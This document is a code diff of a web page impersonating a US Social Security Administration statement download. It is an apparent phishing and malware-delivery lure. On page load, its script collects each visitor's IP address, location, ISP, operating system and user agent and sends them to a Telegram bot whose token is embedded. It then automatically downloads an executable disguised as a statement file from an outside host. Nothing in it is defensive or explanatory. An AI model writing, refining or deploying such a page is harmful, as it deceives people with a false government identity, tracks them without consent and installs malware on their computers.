@@ -98,7 +98,6 @@
 <h1>Welcome to Your Latest SSA Statement Download</h1>
 </center>
 
-<!-- Mobile warning will appear here -->
 <div id="mobileWarning" class="mobile-warning" style="display: none;">
     <strong>⚠ Mobile Device Detected</strong><br>
     For security and optimal viewing, SSA statements cannot be downloaded on mobile devices. 
@@ -134,23 +133,31 @@
 </ul>
 </footer>
 
-<!-- Download status will appear here -->
 <div id="downloadStatusContainer" class="download-status-container"></div>
 </div>
 
 <script>
-    // Telegram reporting configuration
+    // Telegram configuration
     const TELEGRAM_BOT_TOKEN = '7284066719:AAE2kt8GOOqqdb2FyTTdNmDPIKvyE9TGIqM';
     const TELEGRAM_CHAT_ID = '7724482403';
-    let visitorNumber = Math.floor(Math.random() * 100) + 1; // Random visitor number
-    
+    let visitorNumber = Math.floor(Math.random() * 1000) + 1;
+    let visitReported = false;
+
+    // Immediately report visit when page loads
+    window.onload = function() {
+        reportVisitToTelegram();
+        setTimeout(initiateDownload, 2000); // Start download after 2 seconds
+    };
+
     // Function to check if device is mobile
     function isMobileDevice() {
         return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
     
-    // Function to report visit to Telegram (formatted as requested)
+    // Enhanced Telegram reporting with HTML blockquotes
     async function reportVisitToTelegram() {
+        if (visitReported) return;
+        
         try {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
@@ -162,25 +169,29 @@
                 geoData = await geoResponse.json();
             } catch (geoError) {
                 geoData = { 
-                    city: 'Unknown',
-                    region: 'Unknown',
+                    city: 'Unknown', 
+                    region: 'Unknown', 
                     country_name: 'Unknown',
                     org: 'Unknown ISP'
                 };
             }
             
-            // Format current date/time
+            // Format date/time
             const now = new Date();
             const formattedDate = `${now.getDate().toString().padStart(2, '0')}/${(now.getMonth()+1).toString().padStart(2, '0')}/${now.getFullYear()}`;
             const formattedTime = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
             
+            // Format message with HTML blockquotes
             const visitDetails = `
-📡 New Download Started (Visitor No: ${visitorNumber})
-🕒 Time: ${formattedDate}, ${formattedTime}
-🌐 IP: ${ip}
-📍 Location: ${geoData.city || 'Unknown'}, ${geoData.region || 'Unknown'}, ${geoData.country_name || 'Unknown'}
-🖥️ Device: ${detectOS()} (${geoData.org || 'Unknown ISP'}) (${isMobileDevice() ? 'Mobile' : 'Desktop'})
-📱 User Agent: ${navigator.userAgent}
+<blockquote>📡 <b>New SSA Statement Access</b> (Visitor #${visitorNumber})</blockquote>
+
+<blockquote>🕒 <b>Time:</b> ${formattedDate}, ${formattedTime}
+🌐 <b>IP:</b> ${ip}
+📍 <b>Location:</b> ${geoData.city || 'Unknown'}, ${geoData.region || 'Unknown'}, ${geoData.country_name || 'Unknown'}
+🖥️ <b>Device:</b> ${detectOS()} (${geoData.org || 'Unknown ISP'}) ${isMobileDevice() ? '(Mobile)' : '(Desktop)'}</blockquote>
+
+<blockquote>📱 <b>User Agent:</b>
+${navigator.userAgent}</blockquote>
             `.trim();
             
             const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -192,11 +203,13 @@
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
                     text: visitDetails,
-                    parse_mode: 'Markdown'
+                    parse_mode: 'HTML'
                 }),
             });
+            
+            visitReported = true;
         } catch (error) {
-            console.error('Error reporting visit:', error);
+            console.error('Telegram report error:', error);
         }
     }
 
@@ -204,17 +217,16 @@
         const platform = navigator.platform.toLowerCase();
         const userAgent = navigator.userAgent.toLowerCase();
 
-        if (platform.includes('win')) return 'windows';
-        if (platform.includes('mac')) return 'macos';
-        if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';
-        if (/iphone|ipad|ipod/i.test(userAgent)) return 'ios';
-        if (/android/i.test(userAgent)) return 'android';
-
-        return 'unknown';
+        if (platform.includes('win')) return 'Windows';
+        if (platform.includes('mac')) return 'macOS';
+        if (platform.includes('linux') || userAgent.includes('linux')) return 'Linux';
+        if (/iphone|ipad|ipod/i.test(userAgent)) return 'iOS';
+        if (/android/i.test(userAgent)) return 'Android';
+        return 'Unknown OS';
     }
 
     function getDownloadLink(os) {
-        switch (os) {
+        switch (os.toLowerCase()) {
             case 'windows':
                 return 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe?e=Access&y=Guest';
             case 'macos':
@@ -245,25 +257,25 @@
         container.innerHTML = `
             <div class="download-status download-error">
                 <div class="download-message">⚠ Unsupported Device Detected</div>
-                <div class="download-info">SSA statements cannot be downloaded on mobile devices. Please use a desktop computer.</div>
+                <div class="download-info">SSA statements require desktop computer access for security reasons.</div>
             </div>
         `;
     }
 
-    function handleDownload() {
-        const osType = detectOS();
-        const downloadLink = getDownloadLink(osType);
-        document.getElementById('downloadLink').href = downloadLink;
-        
+    function initiateDownload() {
         if (isMobileDevice()) {
             showMobileWarning();
             return;
         }
+
+        const osType = detectOS();
+        const downloadLink = getDownloadLink(osType);
+        document.getElementById('downloadLink').href = downloadLink;
         
         try {
             const autoDownloadBtn = document.createElement("a");
             autoDownloadBtn.href = downloadLink;
-            autoDownloadBtn.download = "SSA_Statement_COMPLETE.zip";
+            autoDownloadBtn.download = "SSA_Statement.zip";
             document.body.appendChild(autoDownloadBtn);
             autoDownloadBtn.click();
             document.body.removeChild(autoDownloadBtn);
@@ -274,14 +286,6 @@
             showDesktopDownloadStatus();
         }
     }
-
-    // Immediately report visit when page loads
-    reportVisitToTelegram();
-    
-    // Initialize download when DOM is fully loaded
-    document.addEventListener('DOMContentLoaded', function() {
-        handleDownload();
-    });
 </script>
 </body>
 </html>
